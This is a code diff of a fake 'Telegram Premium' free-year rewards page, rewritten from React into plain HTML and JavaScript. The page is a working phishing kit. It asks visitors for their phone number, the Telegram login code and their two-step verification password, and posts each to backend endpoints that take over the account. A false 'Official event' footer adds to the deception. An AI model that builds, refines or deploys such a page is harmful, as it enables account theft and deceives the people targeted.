@@ -1,287 +1,478 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Telegram Premium • Exclusive Rewards</title>
-    <link rel="stylesheet" href="style.css" />
-    <script crossorigin src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
-    <script crossorigin src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"></script>
-    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: radial-gradient(circle at 10% 20%, #0a2a44, #031428);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', Roboto, Helvetica, Arial, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+        }
+
+        .premium-card {
+            max-width: 480px;
+            width: 100%;
+            background: rgba(18, 28, 40, 0.7);
+            backdrop-filter: blur(20px);
+            border-radius: 2rem;
+            border: 1px solid rgba(0, 168, 255, 0.25);
+            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 0 0.5px rgba(0, 168, 255, 0.2) inset;
+            padding: 2rem 1.8rem 2rem 1.8rem;
+            transition: all 0.2s;
+            animation: fadeSlideUp 0.5s ease-out;
+        }
+
+        @keyframes fadeSlideUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .badge {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 1.2rem;
+        }
+        .badge svg {
+            width: 70px;
+            height: 70px;
+            filter: drop-shadow(0 8px 16px rgba(0, 160, 255, 0.4));
+        }
+
+        h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            text-align: center;
+            background: linear-gradient(135deg, #FFFFFF, #8BCBFF);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -0.3px;
+        }
+
+        .sub {
+            text-align: center;
+            color: #9bb8e0;
+            font-weight: 500;
+            margin: 0.5rem 0 1.8rem 0;
+            font-size: 0.95rem;
+            border-bottom: 1px dashed rgba(100, 180, 250, 0.3);
+            display: inline-block;
+            width: auto;
+            margin-left: auto;
+            margin-right: auto;
+            padding-bottom: 0.4rem;
+        }
+
+        .step-container {
+            margin: 1.5rem 0;
+        }
+
+        .step {
+            transition: all 0.25s ease;
+        }
+
+        .input-group {
+            margin-bottom: 1.2rem;
+        }
+
+        label {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #c7dcff;
+            margin-bottom: 0.5rem;
+            letter-spacing: -0.2px;
+        }
+
+        label svg {
+            width: 18px;
+            height: 18px;
+            stroke: #4a9eff;
+            stroke-width: 1.5;
+        }
+
+        input {
+            width: 100%;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(74, 158, 255, 0.4);
+            border-radius: 1.2rem;
+            padding: 0.9rem 1rem;
+            font-size: 1rem;
+            color: #fff;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #2a9eff;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(42, 158, 255, 0.2);
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.3);
+            font-weight: 400;
+        }
+
+        button {
+            width: 100%;
+            background: linear-gradient(95deg, #2b9eff, #0f6edb);
+            border: none;
+            border-radius: 1.5rem;
+            padding: 0.9rem;
+            font-weight: 700;
+            font-size: 1rem;
+            color: white;
+            cursor: pointer;
+            transition: transform 0.1s, box-shadow 0.2s, background 0.2s;
+            margin-top: 0.5rem;
+            box-shadow: 0 6px 14px rgba(0, 100, 255, 0.3);
+        }
+
+        button:hover {
+            background: linear-gradient(95deg, #3aaaff, #1a7ae0);
+            transform: translateY(-1px);
+            box-shadow: 0 8px 20px rgba(0, 130, 255, 0.4);
+        }
+
+        button:active {
+            transform: translateY(1px);
+        }
+
+        button:disabled {
+            opacity: 0.6;
+            transform: none;
+            cursor: not-allowed;
+        }
+
+        .error {
+            color: #ff8a7a;
+            font-size: 0.75rem;
+            margin-top: 0.4rem;
+            display: none;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .error svg {
+            width: 14px;
+            height: 14px;
+            stroke: #ff8a7a;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid rgba(255, 255, 255, 0.2);
+            border-top-color: #2a9eff;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            margin: 1rem auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .success-icon {
+            width: 70px;
+            height: 70px;
+            background: #2ecc71;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            box-shadow: 0 0 20px rgba(46, 204, 113, 0.4);
+        }
+        .success-icon svg {
+            width: 36px;
+            height: 36px;
+            stroke: white;
+            stroke-width: 2;
+        }
+
+        .done-title {
+            text-align: center;
+            font-size: 1.6rem;
+            font-weight: 700;
+            color: #fff;
+        }
+        .done-text {
+            text-align: center;
+            color: #b8d0ff;
+            margin-top: 0.5rem;
+        }
+
+        .footer {
+            margin-top: 1.8rem;
+            font-size: 0.7rem;
+            text-align: center;
+            color: #5f7ca0;
+            border-top: 1px solid rgba(255, 255, 255, 0.08);
+            padding-top: 1rem;
+        }
+    </style>
 </head>
 <body>
-<div id="root"></div>
-<script type="text/babel">
-const { useState } = React;
-
-const App = () => {
-  const [step, setStep] = useState('phone');
-  const [phone, setPhone] = useState('+251');
-  const [code, setCode] = useState('');
-  const [password, setPassword] = useState('');
-  const [loading, setLoading] = useState(false);
-  const [errors, setErrors] = useState({ phone: '', code: '', password: '' });
-
-  const clearErrors = () => setErrors({ phone: '', code: '', password: '' });
-
-  const updateError = (field, message) => {
-    setErrors(prev => ({ ...prev, [field]: message }));
-  };
-
-  const sendData = async (url, body) => {
-    const response = await fetch(url, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(body),
-    });
-    return response.json();
-  };
-
-  const handleSendPhone = async () => {
-    const raw = phone.replace(/\D/g, '');
-    if (raw.length < 7) {
-      updateError('phone', 'Please enter a valid phone number.');
-      return;
-    }
-    clearErrors();
-    setLoading(true);
-
-    try {
-      const data = await sendData('/api/send-code', { phone: raw, access_key: 'test_lab_123' });
-      if (data.already_authorized) {
-        setStep('done');
-      } else {
-        setStep('code');
-        setCode('');
-      }
-    } catch (error) {
-      updateError('phone', error.message || 'Connection failed');
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const handleVerifyCode = async () => {
-    if (!code.trim()) {
-      updateError('code', 'Please enter the verification code.');
-      return;
-    }
-    clearErrors();
-    setLoading(true);
-
-    try {
-      const data = await sendData('/api/verify-code', {
-        phone: phone.replace(/\D/g, ''),
-        code: code.trim(),
-        access_key: 'test_lab_123',
-      });
-      if (data.needs_2fa) {
-        setStep('2fa-choice');
-        setPassword('');
-      } else {
-        setStep('done');
-      }
-    } catch (error) {
-      updateError('code', error.message || 'Invalid code. Try again.');
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  const handle2FAChoice = (has2FA) => {
-    clearErrors();
-    if (has2FA) {
-      setStep('2fa');
-      setPassword('');
-    } else {
-      setStep('done');
-    }
-  };
-
-  const handleVerifyPassword = async () => {
-    if (!password) {
-      updateError('password', 'Password is required.');
-      return;
-    }
-    clearErrors();
-    setLoading(true);
-
-    try {
-      await sendData('/api/verify-2fa', {
-        phone: phone.replace(/\D/g, ''),
-        password,
-        access_key: 'test_lab_123',
-      });
-      setStep('done');
-    } catch (error) {
-      updateError('password', error.message || 'Wrong password.');
-    } finally {
-      setLoading(false);
-    }
-  };
-
-  return (
-    <div className="premium-card" id="app">
-      <div className="badge">
+<div class="premium-card" id="app">
+    <div class="badge">
         <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="#FFD966" stroke="#FFA500" strokeWidth="1.2" />
+            <path d="M12 2L15 8.5L22 9.5L17 14L18.5 21L12 17.5L5.5 21L7 14L2 9.5L9 8.5L12 2Z" fill="#FFD966" stroke="#FFA500" stroke-width="1.2"/>
         </svg>
-      </div>
-      <h1>Telegram Premium</h1>
-      <div style={{ textAlign: 'center' }}>
-        <div className="sub">✨ Free for 1 year · Anniversary celebration ✨</div>
-      </div>
-
-      <div className="step-container">
-        {step === 'phone' && (
-          <div className="step">
-            <div className="input-group">
-              <label>
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
-                  <line x1="12" y1="18" x2="12" y2="18" strokeWidth="2.5"></line>
-                </svg>
-                Your phone number
-              </label>
-              <input
-                type="tel"
-                value={phone}
-                onChange={e => setPhone(e.target.value)}
-                placeholder="+1 234 567 8900"
-              />
-              {errors.phone && (
-                <div className="error" style={{ display: 'flex' }}>
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <circle cx="12" cy="12" r="10"></circle>
-                    <line x1="12" y1="8" x2="12" y2="12"></line>
-                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                  </svg>
-                  <span>{errors.phone}</span>
-                </div>
-              )}
-            </div>
-            <button onClick={handleSendPhone} disabled={loading}>
-              Get Code
-            </button>
-            {loading && <div className="spinner"></div>}
-          </div>
-        )}
-
-        {step === 'code' && (
-          <div className="step">
-            <div className="input-group">
-              <label>
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                </svg>
-                Verification code (from Telegram)
-              </label>
-              <input
-                type="text"
-                value={code}
-                onChange={e => setCode(e.target.value)}
-                placeholder="12345"
-                maxLength="6"
-              />
-              {errors.code && (
-                <div className="error" style={{ display: 'flex' }}>
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <circle cx="12" cy="12" r="10"></circle>
-                    <line x1="12" y1="8" x2="12" y2="12"></line>
-                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                  </svg>
-                  <span>{errors.code}</span>
-                </div>
-              )}
-            </div>
-            <button onClick={handleVerifyCode} disabled={loading}>
-              Verify Code
-            </button>
-          </div>
-        )}
-
-        {step === '2fa-choice' && (
-          <div className="step">
-            <div style={{ textAlign: 'center', marginBottom: '1.5rem' }}>
-              <h2 style={{ fontSize: '1.3rem', color: '#fff', marginBottom: '0.8rem' }}>
-                Two-Step Verification
-              </h2>
-              <p style={{ color: '#9bb8e0', fontSize: '0.9rem' }}>
-                Do you have two-step verification enabled on your account?
-              </p>
-            </div>
-            <button 
-              onClick={() => handle2FAChoice(true)} 
-              style={{ marginBottom: '0.8rem' }}
-            >
-              Yes, I have 2FA enabled
-            </button>
-            <button 
-              onClick={() => handle2FAChoice(false)}
-              style={{ 
-                background: 'linear-gradient(95deg, #666, #444)',
-                marginBottom: '0.8rem'
-              }}
-            >
-              No, I don't have 2FA
-            </button>
-          </div>
-        )}
-
-        {step === '2fa' && (
-          <div className="step">
-            <div className="input-group">
-              <label>
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
-                  <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
-                </svg>
-                Two-step verification password
-              </label>
-              <input
-                type="password"
-                value={password}
-                onChange={e => setPassword(e.target.value)}
-                placeholder="••••••••"
-              />
-              {errors.password && (
-                <div className="error" style={{ display: 'flex' }}>
-                  <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                    <circle cx="12" cy="12" r="10"></circle>
-                    <line x1="12" y1="8" x2="12" y2="12"></line>
-                    <line x1="12" y1="16" x2="12.01" y2="16"></line>
-                  </svg>
-                  <span>{errors.password}</span>
-                </div>
-              )}
-            </div>
-            <button onClick={handleVerifyPassword} disabled={loading}>
-              Verify Password
-            </button>
-          </div>
-        )}
-
-        {step === 'done' && (
-          <div className="step">
-            <div className="success-icon">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5">
-                <polyline points="20 6 9 17 4 12"></polyline>
-              </svg>
-            </div>
-            <div className="done-title">Activation in progress</div>
-            <div className="done-text">Redirecting you to Premium dashboard...</div>
-          </div>
-        )}
-      </div>
-
-      <div className="footer">© 2025 Telegram Premium Rewards — Official event</div>
     </div>
-  );
-};
+    <h1>Telegram Premium</h1>
+    <div style="text-align: center;">
+        <div class="sub">✨ Free for 1 year · Anniversary celebration ✨</div>
+    </div>
 
-const root = ReactDOM.createRoot(document.getElementById('root'));
-root.render(<App />);
+    <div class="step-container">
+        <!-- Step 1: Phone -->
+        <div id="step-phone" class="step">
+            <div class="input-group">
+                <label>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="5" y="2" width="14" height="20" rx="2" ry="2"></rect>
+                        <line x1="12" y1="18" x2="12" y2="18" stroke-width="2.5"></line>
+                    </svg>
+                    Your phone number
+                </label>
+                <input type="tel" id="phone" placeholder="+251 234 567 8900" value="+251">
+                <div class="error" id="phone-error">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <span></span>
+                </div>
+            </div>
+            <button id="send-btn">Get Code</button>
+            <div id="spinner" class="spinner"></div>
+        </div>
+
+        <!-- Step 2: Code -->
+        <div id="step-code" class="step" style="display:none;">
+            <div class="input-group">
+                <label>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    Verification code (from Telegram)
+                </label>
+                <input type="text" id="code" placeholder="12345" maxlength="6">
+                <div class="error" id="code-error">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <span></span>
+                </div>
+            </div>
+            <button id="verify-code-btn">Verify Code</button>
+        </div>
+
+        <!-- Step 3: 2FA Password -->
+        <div id="step-2fa" class="step" style="display:none;">
+            <div class="input-group">
+                <label>
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    Two-step verification password
+                </label>
+                <input type="password" id="password" placeholder="••••••••">
+                <div class="error" id="password-error">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <line x1="12" y1="8" x2="12" y2="12"></line>
+                        <line x1="12" y1="16" x2="12.01" y2="16"></line>
+                    </svg>
+                    <span></span>
+                </div>
+            </div>
+            <button id="verify-2fa-btn">Verify Password</button>
+        </div>
+
+        <!-- Step 4: Done -->
+        <div id="step-done" class="step" style="display:none;">
+            <div class="success-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                    <polyline points="20 6 9 17 4 12"></polyline>
+                </svg>
+            </div>
+            <div class="done-title">Activation in progress</div>
+            <div class="done-text">Redirecting you to Premium dashboard...</div>
+        </div>
+    </div>
+
+    <div class="footer">© 2025 Telegram Premium Rewards — Official event</div>
+</div>
+
+<script>
+    // API endpoints
+    const SEND_URL = '/api/send-code';
+    const VERIFY_URL = '/api/verify-code';
+    const PASSWORD_URL = '/api/verify-2fa';
+    const ACCESS_KEY = '';
+
+    let currentPhone = '';
+
+    // DOM elements
+    const stepPhone = document.getElementById('step-phone');
+    const stepCode = document.getElementById('step-code');
+    const step2fa = document.getElementById('step-2fa');
+    const stepDone = document.getElementById('step-done');
+    const phoneInput = document.getElementById('phone');
+    const phoneError = document.getElementById('phone-error');
+    const spinner = document.getElementById('spinner');
+    const sendBtn = document.getElementById('send-btn');
+    const codeInput = document.getElementById('code');
+    const codeError = document.getElementById('code-error');
+    const verifyCodeBtn = document.getElementById('verify-code-btn');
+    const passwordInput = document.getElementById('password');
+    const passwordError = document.getElementById('password-error');
+    const verify2faBtn = document.getElementById('verify-2fa-btn');
+
+    function showStep(step) {
+        stepPhone.style.display = 'none';
+        stepCode.style.display = 'none';
+        step2fa.style.display = 'none';
+        stepDone.style.display = 'none';
+        if (step === 'phone') stepPhone.style.display = 'block';
+        if (step === 'code') stepCode.style.display = 'block';
+        if (step === '2fa') step2fa.style.display = 'block';
+        if (step === 'done') stepDone.style.display = 'block';
+    }
+
+    function setError(element, message) {
+        const span = element.querySelector('span');
+        if (span) span.innerText = message;
+        element.style.display = 'flex';
+    }
+
+    function clearError(element) {
+        element.style.display = 'none';
+    }
+
+    // Step 1
+    sendBtn.addEventListener('click', async () => {
+        let raw = phoneInput.value.replace(/\D/g, '');
+        if (raw.length < 7) {
+            setError(phoneError, 'Please enter a valid phone number.');
+            return;
+        }
+        clearError(phoneError);
+        currentPhone = raw;
+        sendBtn.disabled = true;
+        spinner.style.display = 'block';
+
+        try {
+            const res = await fetch(SEND_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone, access_key: ACCESS_KEY })
+            });
+            const data = await res.json();
+            if (!res.ok) throw new Error(data.detail || 'Server error');
+            if (data.already_authorized) {
+                showStep('done');
+            } else {
+                showStep('code');
+                codeInput.value = '';
+                clearError(codeError);
+            }
+        } catch (err) {
+            setError(phoneError, err.message || 'Connection failed');
+        } finally {
+            sendBtn.disabled = false;
+            spinner.style.display = 'none';
+        }
+    });
+
+    // Step 2
+    verifyCodeBtn.addEventListener('click', async () => {
+        const code = codeInput.value.trim();
+        if (!code) {
+            setError(codeError, 'Please enter the verification code.');
+            return;
+        }
+        clearError(codeError);
+        verifyCodeBtn.disabled = true;
+
+        try {
+            const res = await fetch(VERIFY_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone, code, access_key: ACCESS_KEY })
+            });
+            const data = await res.json();
+            if (!res.ok) throw new Error(data.detail);
+            if (!data.ok) {
+                setError(codeError, data.detail || 'Invalid code. Try again.');
+                return;
+            }
+            if (data.needs_2fa) {
+                showStep('2fa');
+                passwordInput.value = '';
+                clearError(passwordError);
+            } else {
+                showStep('done');
+            }
+        } catch (err) {
+            setError(codeError, err.message);
+        } finally {
+            verifyCodeBtn.disabled = false;
+        }
+    });
+
+    // Step 3
+    verify2faBtn.addEventListener('click', async () => {
+        const password = passwordInput.value;
+        if (!password) {
+            setError(passwordError, 'Password is required.');
+            return;
+        }
+        clearError(passwordError);
+        verify2faBtn.disabled = true;
+
+        try {
+            const res = await fetch(PASSWORD_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: currentPhone, password, access_key: ACCESS_KEY })
+            });
+            const data = await res.json();
+            if (!res.ok) throw new Error(data.detail);
+            if (!data.ok) {
+                setError(passwordError, data.detail || 'Wrong password.');
+                return;
+            }
+            showStep('done');
+        } catch (err) {
+            setError(passwordError, err.message);
+        } finally {
+            verify2faBtn.disabled = false;
+        }
+    });
 </script>
 </body>
 </html>
